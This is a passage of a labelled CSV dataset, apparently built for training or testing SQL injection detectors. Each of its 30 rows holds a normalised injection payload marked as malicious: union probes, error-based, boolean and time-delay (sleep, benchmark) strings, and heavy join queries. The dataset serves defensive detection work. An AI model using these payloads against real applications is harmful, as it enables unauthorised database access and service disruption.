row_index,payload_norm,label,sqli_type_hint
2670,"-5362 ) union all select 7297,7297,7297,7297,7297#",1,
2671,1'+ ( select kfmv where 1679 = 1679,1,
2672,"1' ) as taay where 7027 = 7027 and elt ( 4249 = 4249,7259 ) --",1,
2673,-8234' ) ) ) or 9323 = 9323#,1,
2674,"1' where 1031 = 1031 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,
2675,1' ) where 6305 = 6305 rlike ( select ( case when ( 8326 = 9749 ) then 1 else 0x28 end ) ) --,1,
2676,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%"" = """,1,
2677,"1%"" ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ""%"" = """,1,
2678,"1' in boolean mode ) and elt ( 4249 = 4249,7259 ) #",1,
2679,"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) -- dtha",1,
2680,1 ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 1476 = 1476,1,
2681,1%' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = ',1,
2682,"-4811%' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",1,
2683,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt' = 'qipt",1,
2684,"1"" ) as wxea where 6394 = 6394 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
2685,"1"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""eoab"" like ""eoab",1,
2686,"-9145%' ) ) ) or make_set ( 9017 = 9368,9368 ) and ( ( ( '%' = '",1,
2687,"1' ) where 7646 = 7646 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
2688,"1%"" ) union all select null,null,null,null,null,null,null,null,null,null--",1,
2689,"-6389"" union all select 2355,2355,2355,2355,2355--",1,
2690,"1"" ) ) as chal where 6661 = 6661",1,
2691,1' ) ) as iipj where 6560 = 6560,1,
2692,"1"" ) or sleep ( 5 ) and ( ""fiag"" like ""fiag",1,
2693,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'ejdk' like 'ejdk,1,
2694,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",1,
2695,"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ""okpa"" = ""okpa",1,
2696,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",1,
2697,"-2896' ) ) as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#",1,
2698,-9363%' or ( 8459 = 8459 ) *4906 and '%' = ',1,
2699,"1%' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",1,
